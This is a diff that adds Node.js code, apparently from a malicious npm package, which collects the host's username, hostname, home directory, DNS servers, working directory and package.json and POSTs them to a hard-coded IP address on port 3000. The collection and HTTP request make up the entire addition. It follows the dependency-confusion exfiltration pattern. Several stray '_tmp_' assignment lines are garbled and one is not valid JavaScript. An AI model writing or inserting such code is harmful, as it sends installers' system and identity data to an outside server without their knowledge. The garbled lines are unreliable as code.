@@ -1,0 +1,36 @@
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON.resolved || undefined, // Check if resolved exists
+    v: packageJSON.version,
+    pjson: packageJSON,
+})
+_tmp_0.hd = os.homedir()
+var postData = querystring.stringify({
+    msg: trackingData,
+})
+_tmp_1.msg = trackingData
+var options = {
+    hostname: "52.15.44.253", // Ensure this is your server's public IP or domain
+    port: 3000,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": Buffer.byteLength(postData), // Use Buffer.byteLength for accurate length
+    },
+}
+_tmp_2.headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": Buffer.byteLength(postData), // Use Buffer.byteLength for accurate length
+    }
+_tmp_3.Content-Length = Buffer.byteLength(postData)
+var req = http.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+})
